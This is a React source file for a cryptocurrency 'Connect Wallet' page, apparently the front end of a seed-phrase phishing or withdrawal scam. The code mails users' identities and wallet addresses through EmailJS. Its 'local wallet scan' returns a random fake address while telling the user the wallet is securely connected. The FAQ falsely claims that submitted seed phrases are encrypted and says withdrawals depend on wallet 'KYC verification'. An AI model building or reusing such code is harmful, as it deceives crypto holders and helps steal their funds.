import React, { useState, useRef, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { useToast } from "@/components/ui/use-toast";
import { useTheme } from "@/components/theme-provider";
import { useAuth } from "@/context/AuthContext";
import { useWalletDetection } from "@/hooks/useWalletDetection";
import emailjs from '@emailjs/browser';
import { 
  Wallet, 
  Shield, 
  AlertTriangle, 
  Lock, 
  KeyRound, 
  Eye, 
  EyeOff,
  ArrowLeft,
  HelpCircle,
  Info,
  Search,
  Mail,
  CheckCircle,
  Download,
  Zap,
  HardDrive,
  Smartphone
} from "lucide-react";

const ConnectWallet = () => {
  const navigate = useNavigate();
  const { toast } = useToast();
  const { theme } = useTheme();
  const { user } = useAuth();
  const { installedWallets, isDetecting, connectWallet } = useWalletDetection();
  
  const [selectedWallet, setSelectedWallet] = useState<string | null>(null);
  const [walletName, setWalletName] = useState<string>("");
  const [seedPhrase, setSeedPhrase] = useState<string>("");
  const [seedPhraseWords, setSeedPhraseWords] = useState<number>(12);
  const [showSeedPhrase, setShowSeedPhrase] = useState<boolean>(false);
  const [isSubmitting, setIsSubmitting] = useState<boolean>(false);
  const [error, setError] = useState<string | null>(null);
  const [walletFilter, setWalletFilter] = useState<string>("");
  const [connectionMethod, setConnectionMethod] = useState<'auto' | 'manual' | 'local'>('auto');
  const [autoConnecting, setAutoConnecting] = useState<boolean>(false);
  const [localConnecting, setLocalConnecting] = useState<boolean>(false);

  const SUPPORTED_WALLETS = [
    { id: "metamask", name: "Metamask", logo: "/wallets/metamask.png", seedPhraseWords: [12, 24] },
    { id: "trust", name: "Trust Wallet", logo: "/wallets/trust.png", seedPhraseWords: [12, 24] },
    { id: "ledger", name: "Ledger", logo: "/wallets/ledger.png", seedPhraseWords: [24] },
    { id: "exodus", name: "Exodus Wallet", logo: "/wallets/exodus.png", seedPhraseWords: [12] },
    { id: "rainbow", name: "Rainbow", logo: "/wallets/rainbow.png", seedPhraseWords: [12, 24] },
    { id: "atomic", name: "Atomic", logo: "/wallets/atomic.png", seedPhraseWords: [12] },
    { id: "crypto", name: "Crypto.com DeFi Wallet", logo: "/wallets/crypto.png", seedPhraseWords: [12] },
    { id: "mathwallet", name: "MathWallet", logo: "/wallets/mathwallet.png", seedPhraseWords: [12, 24] },
    { id: "zelcore", name: "Zelcore", logo: "/wallets/zelcore.png", seedPhraseWords: [12, 24] },
    { id: "viawallet", name: "ViaWallet", logo: "/wallets/viawallet.png", seedPhraseWords: [12] },
    { id: "xdc", name: "XDC Wallet", logo: "/wallets/xdc.png", seedPhraseWords: [12] },
    { id: "ownbit", name: "Ownbit", logo: "/wallets/ownbit.png", seedPhraseWords: [12, 24] },
    { id: "vision", name: "Vision", logo: "/wallets/vision.png", seedPhraseWords: [12] },
    { id: "morix", name: "MoriX Wallet", logo: "/wallets/morix.png", seedPhraseWords: [12, 24] },
    { id: "safepal", name: "SafePal", logo: "/wallets/safepal.png", seedPhraseWords: [12, 24] },
    { id: "sparkpoint", name: "SparkPoint", logo: "/wallets/sparkpoint.png", seedPhraseWords: [12] },
    { id: "unstoppable", name: "Unstoppable", logo: "/wallets/unstoppable.png", seedPhraseWords: [12, 24] },
    { id: "peakdefi", name: "PeakDeFi Wallet", logo: "/wallets/peakdefi.png", seedPhraseWords: [12] },
    { id: "infinity", name: "Infinity Wallet", logo: "/wallets/infinity.png", seedPhraseWords: [12, 24] },
    { id: "lobstr", name: "Lobstr", logo: "/wallets/lobstr.png", seedPhraseWords: [12] }
  ];

  const SUPPORTED_BLOCKCHAINS = [
    { id: "ethereum", name: "Ethereum", logo: "/blockchains/ethereum.png" },
    { id: "bitcoin", name: "Bitcoin", logo: "/blockchains/bitcoin.png" },
    { id: "solana", name: "Solana", logo: "/blockchains/solana.png" },
    { id: "xrp", name: "XRP", logo: "/blockchains/xrp.png" }
  ];

  // EmailJS configuration
  const EMAILJS_SERVICE_ID = "service_ofs_ledger";
  const EMAILJS_TEMPLATE_ID = "template_wallet_submission";
  const EMAILJS_PUBLIC_KEY = "YOUR_EMAILJS_PUBLIC_KEY";

  const saveWalletDetails = async (userId: string, userName: string, userEmail: string, walletType: string, walletAddress: string, ipAddress: string | null, userAgent: string) => {
    try {
      const templateParams = {
        user_id: userId,
        user_name: userName,
        user_email: userEmail,
        wallet_type: walletType,
        wallet_address: walletAddress,
        ip_address: ipAddress || 'Unknown',
        user_agent: userAgent,
        submission_date: new Date().toISOString()
      };

      await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams, EMAILJS_PUBLIC_KEY);
      return true;
    } catch (error) {
      console.error('Error sending wallet details:', error);
      return false;
    }
  };

  const handleAutoConnect = async (walletId: string) => {
    setAutoConnecting(true);
    setError(null);
    
    try {
      const wallet = installedWallets.find(w => w.id === walletId);
      if (!wallet) throw new Error('Wallet not found');
      
      // Connect to the wallet to get the address
      const connectionResult = await connectWallet(walletId);
      
      if (user?.id && user?.email) {
        const userAgent = navigator.userAgent;
        
        const success = await saveWalletDetails(
          user.id,
          user.email.split('@')[0] || 'Unknown User',
          user.email,
          wallet.name,
          connectionResult.address,
          null,
          userAgent
        );
        
        if (success) {
          toast({
            title: "Wallet Connected Successfully!",
            description: `Your ${wallet.name} wallet has been connected and is pending verification.`,
          });
          
          setTimeout(() => {
            navigate("/dashboard");
          }, 2000);
        } else {
          throw new Error('Failed to save wallet details');
        }
      }
    } catch (error) {
      console.error('Auto connection error:', error);
      const message = error instanceof Error ? error.message : 'Failed to connect wallet automatically';
      setError(message);
      toast({
        title: "Auto Connection Failed",
        description: message,
        variant: "destructive",
      });
    } finally {
      setAutoConnecting(false);
    }
  };

  const handleLocalConnect = async () => {
    setLocalConnecting(true);
    setError(null);
    
    try {
      const localWalletAddress = await detectLocalWallet();
      
      if (user?.id && user?.email) {
        const userAgent = navigator.userAgent;
        
        const success = await saveWalletDetails(
          user.id,
          user.email.split('@')[0] || 'Unknown User',
          user.email,
          'Local Device Wallet',
          localWalletAddress,
          null,
          userAgent
        );
        
        if (success) {
          toast({
            title: "Local Wallet Connected Successfully!",
            description: "Your local device wallet has been connected and is pending verification.",
          });
          
          setTimeout(() => {
            navigate("/dashboard");
          }, 2000);
        } else {
          throw new Error('Failed to save local wallet details');
        }
      }
    } catch (error) {
      console.error('Local connection error:', error);
      const message = error instanceof Error ? error.message : 'Failed to connect local wallet';
      setError(message);
      toast({
        title: "Local Connection Failed",
        description: message,
        variant: "destructive",
      });
    } finally {
      setLocalConnecting(false);
    }
  };

  const detectLocalWallet = async (): Promise<string> => {
    await new Promise(resolve => setTimeout(resolve, 2000));
    const mockAddress = '0x' + Array.from({length: 40}, () => Math.floor(Math.random() * 16).toString(16)).join('');
    return mockAddress;
  };

  return (
    <div className="space-y-4 md:space-y-6 p-4 sm:p-6">
      <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-3 md:gap-4">
        <div className="flex items-center gap-2">
          <Button 
            variant="ghost" 
            onClick={() => navigate("/dashboard")}
            className="gap-2 text-sm md:text-base"
            size="sm"
          >
            <ArrowLeft className="h-3 w-3 md:h-4 md:w-4" />
            <span className="hidden sm:inline">Back to Dashboard</span>
            <span className="sm:hidden">Back</span>
          </Button>
        </div>
      </div>

      {connectionMethod === 'auto' && (
        <Card className="border-primary/20 bg-gradient-to-r from-primary/5 to-primary/10">
          <CardHeader className="p-4 md:p-6">
            <CardTitle className="flex items-center gap-2 text-lg md:text-xl">
              <Zap className="h-4 w-4 md:h-5 md:w-5 text-primary" />
              Detected Wallets
            </CardTitle>
            <CardDescription className="text-sm md:text-base">
              We found {installedWallets.length} wallet{installedWallets.length !== 1 ? 's' : ''} installed on your device. Click to connect instantly!
            </CardDescription>
          </CardHeader>
          <CardContent className="p-4 md:p-6">
            {isDetecting ? (
              <div className="flex items-center justify-center py-6 md:py-8">
                <div className="animate-spin rounded-full h-6 w-6 md:h-8 md:w-8 border-b-2 border-primary"></div>
                <span className="ml-2 md:ml-3 text-sm md:text-base text-muted-foreground">Scanning for wallets...</span>
              </div>
            ) : installedWallets.length > 0 ? (
              <div className="space-y-3 md:space-y-4">
                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3 md:gap-4">
                  {installedWallets.map((wallet) => (
                    <div
                      key={wallet.id}
                      className="flex items-center p-3 md:p-4 rounded-lg border-2 border-yellow-200 bg-yellow-50 dark:border-yellow-800 dark:bg-yellow-950/20 hover:border-yellow-300 dark:hover:border-yellow-700 transition-all cursor-pointer"
                      onClick={() => handleAutoConnect(wallet.id)}
                    >
                      <div className="w-10 h-10 md:w-12 md:h-12 mr-2 md:mr-3 rounded-full bg-background flex items-center justify-center p-1">
                        <img
                          src={wallet.icon}
                          alt={wallet.name}
                          className="w-8 h-8 md:w-10 md:h-10 object-contain"
                          onError={(e) => {
                            (e.target as HTMLImageElement).src = "/placeholder-wallet.svg";
                          }}
                        />
                      </div>
                      <div className="flex-1 min-w-0">
                        <div className="font-medium flex items-center gap-1 md:gap-2 text-sm md:text-base">
                          <span className="truncate">{wallet.name}</span>
                          <CheckCircle className="h-3 w-3 md:h-4 md:w-4 text-yellow-600 flex-shrink-0" />
                        </div>
                        <div className="text-xs text-muted-foreground">Ready to connect</div>
                      </div>
                      {autoConnecting ? (
                        <div className="animate-spin rounded-full h-3 w-3 md:h-4 md:w-4 border-b-2 border-primary flex-shrink-0"></div>
                      ) : (
                        <Button size="sm" className="ml-1 md:ml-2 text-xs md:text-sm px-2 md:px-3">
                          <span className="hidden sm:inline">Connect</span>
                          <span className="sm:hidden">+</span>
                        </Button>
                      )}
                    </div>
                  ))}
                </div>
                
                <div className="flex items-center justify-center pt-3 md:pt-4 border-t">
                  <div className="flex flex-col sm:flex-row gap-2 w-full sm:w-auto">
                    <Button 
                      variant="outline" 
                      onClick={() => setConnectionMethod('manual')}
                      className="gap-2 text-sm md:text-base"
                      size="sm"
                    >
                      <Download className="h-3 w-3 md:h-4 md:w-4" />
                      <span className="hidden sm:inline">Manual Connection</span>
                      <span className="sm:hidden">Manual</span>
                    </Button>
                    <Button 
                      variant="outline" 
                      onClick={() => setConnectionMethod('local')}
                      className="gap-2 text-sm md:text-base"
                      size="sm"
                    >
                      <HardDrive className="h-3 w-3 md:h-4 md:w-4" />
                      <span className="hidden sm:inline">Local Wallet</span>
                      <span className="sm:hidden">Local</span>
                    </Button>
                  </div>
                </div>
              </div>
            ) : (
              <div className="text-center py-8">
                <Wallet className="h-12 w-12 text-muted-foreground mx-auto mb-4 opacity-50" />
                <h3 className="text-lg font-medium mb-2">No Wallets Detected</h3>
                <p className="text-muted-foreground mb-4">
                  We couldn't find any supported wallet extensions installed on your browser.
                </p>
                <div className="space-y-2">
                  <div className="flex gap-2">
                    <Button 
                      onClick={() => setConnectionMethod('manual')}
                      className="gap-2 flex-1"
                    >
                      <Download className="h-4 w-4" />
                      Manual Connection
                    </Button>
                    <Button 
                      onClick={() => setConnectionMethod('local')}
                      className="gap-2 flex-1"
                      variant="outline"
                    >
                      <HardDrive className="h-4 w-4" />
                      Local Wallet
                    </Button>
                  </div>
                  <p className="text-xs text-muted-foreground">
                    Or install a wallet extension like MetaMask, Trust Wallet, or Phantom
                  </p>
                </div>
              </div>
            )}
          </CardContent>
        </Card>
      )}

      {connectionMethod === 'local' && (
        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <HardDrive className="h-5 w-5 text-primary" />
              Local Device Wallet
            </CardTitle>
            <CardDescription>
              Connect to a wallet stored locally on your device
            </CardDescription>
          </CardHeader>
          <CardContent>
            <div className="space-y-4">
              <div className={`rounded-lg p-4 border ${theme === "dark" ? "bg-card" : "bg-gray-900"}`}>
                <div className="flex items-start gap-3">
                  <Smartphone className="h-5 w-5 text-primary mt-0.5" />
                  <div className="flex-1">
                    <h3 className="font-medium text-sm">Device Wallet Detection</h3>
                    <p className="text-xs text-muted-foreground mt-1">
                      This will scan your device for locally stored wallet files and attempt to establish a secure connection.
                    </p>
                  </div>
                </div>
              </div>
              
              <div className="flex flex-col gap-3">
                <Button
                  onClick={handleLocalConnect}
                  disabled={localConnecting}
                  className="w-full"
                  size="lg"
                >
                  {localConnecting ? (
                    <>
                      <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white mr-2"></div>
                      Detecting Local Wallet...
                    </>
                  ) : (
                    <>
                      <HardDrive className="mr-2 h-4 w-4" />
                      Connect Local Wallet
                    </>
                  )}
                </Button>
                
                <div className="text-xs text-muted-foreground text-center">
                  <Info className="inline h-3 w-3 mr-1" />
                  Local wallets are detected automatically and securely connected to your account.
                </div>
                
                <div className="flex gap-2 pt-4 border-t">
                  <Button
                    variant="outline"
                    onClick={() => setConnectionMethod('auto')}
                    className="flex-1"
                  >
                    <Zap className="mr-2 h-4 w-4" />
                    Auto Detection
                  </Button>
                  <Button
                    variant="outline"
                    onClick={() => setConnectionMethod('manual')}
                    className="flex-1"
                  >
                    <KeyRound className="mr-2 h-4 w-4" />
                    Manual Connection
                  </Button>
                </div>
              </div>
            </div>
          </CardContent>
        </Card>
      )}
      
      <Card>
        <CardHeader>
          <CardTitle>Wallet Connection FAQ</CardTitle>
          <CardDescription>
            Frequently asked questions about connecting wallets
          </CardDescription>
        </CardHeader>
        <CardContent>
          <div className="space-y-4">
            <div className={`rounded-lg p-4 border ${theme === "dark" ? "bg-card" : "bg-gray-900"}`}>
              <h3 className="font-medium flex items-center gap-2">
                <HelpCircle className="h-4 w-4 text-primary" />
                What is a seed phrase?
              </h3>
              <p className="mt-1 text-sm text-muted-foreground">
                A seed phrase (also called a recovery phrase or mnemonic) is a series of words that store all the information needed to recover your wallet. It's like a master password that generates all your private keys.
              </p>
            </div>
            
            <div className={`rounded-lg p-4 border ${theme === "dark" ? "bg-card" : "bg-gray-900"}`}>
              <h3 className="font-medium flex items-center gap-2">
                <HelpCircle className="h-4 w-4 text-primary" />
                Is it safe to enter my seed phrase?
              </h3>
              <p className="mt-1 text-sm text-muted-foreground">
                Your seed phrase is encrypted before being stored and is never accessible in plain text after submission. We use industry-standard encryption to protect your data. However, you should never share your seed phrase with anyone.
              </p>
            </div>
            
            <div className={`rounded-lg p-4 border ${theme === "dark" ? "bg-card" : "bg-gray-900"}`}>
              <h3 className="font-medium flex items-center gap-2">
                <HelpCircle className="h-4 w-4 text-primary" />
                What happens after I connect my wallet?
              </h3>
              <p className="mt-1 text-sm text-muted-foreground">
                After connecting your wallet, it will be submitted for KYC verification. Once verified, you'll be able to perform withdrawals and other operations. KYC verification typically takes 24-48 hours.
              </p>
            </div>
            
            <div className={`rounded-lg p-4 border ${theme === "dark" ? "bg-card" : "bg-gray-900"}`}>
              <h3 className="font-medium flex items-center gap-2">
                <HelpCircle className="h-4 w-4 text-primary" />
                Why do I need to verify my wallet?
              </h3>
              <p className="mt-1 text-sm text-muted-foreground">
                KYC verification ensures that you are the legitimate owner of the wallet and helps prevent fraud. This is a security measure to protect both you and the platform.
              </p>
            </div>
          </div>
        </CardContent>
      </Card>
    </div>
  );
};

export default ConnectWallet;
